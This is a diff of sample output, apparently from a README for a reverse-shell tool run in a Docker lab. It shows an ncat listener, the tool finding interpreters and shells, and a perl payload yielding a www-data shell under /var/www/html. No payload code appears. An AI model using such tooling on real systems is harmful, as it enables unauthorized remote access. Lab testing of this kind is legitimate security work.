@@ -70,7 +70,7 @@ Available interfaces...
 [-] br-aa3534e13396
 [-] br-c7551daa06d2
 [-] br-2369a8165a53
-[-] veth18d6ac6
+[-] veth7b49643
 No interface provided. Please enter the name of an available interface or 'exit' to quit:
 > docker0
 docker0 selected. Address to use is 172.17.0.1
@@ -85,20 +85,19 @@ Ncat: Version 7.93 ( https://nmap.org/ncat )
 Ncat: Listening on :::1026
 Ncat: Listening on 0.0.0.0:1026
 [-] perl found at /usr/bin/perl
-[-] perl found at /usr/bin/perl5.32-x86_64-linux-gnu
 [-] php found at /usr/local/bin/php
-[-] python found at /usr/bin/python3.9
-[-] ruby found at /usr/bin/ruby2.7
+[-] python3 found at /usr/bin/python3
 [-] ruby found at /usr/bin/ruby
 [-] go found at /usr/bin/go
+[-] node found at /usr/bin/node
 Finding shells...
-[-] bash found at /bin/bash
-[-] sh found at /bin/sh
+[-] bash found at /usr/bin/bash
+[-] sh found at /usr/bin/sh
 Executing reverse shell...
-Bins to test: 7
+Bins to test: 6
 Shells to test: 2
 [!] Attempting perl payloads for path /usr/bin/perl
 Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:46232.
-www-data@3b20951ed443:/var/www/html$
+Ncat: Connection from 172.17.0.2:40170.
+www-data@849d7a9007c8:/var/www/html$
 ```
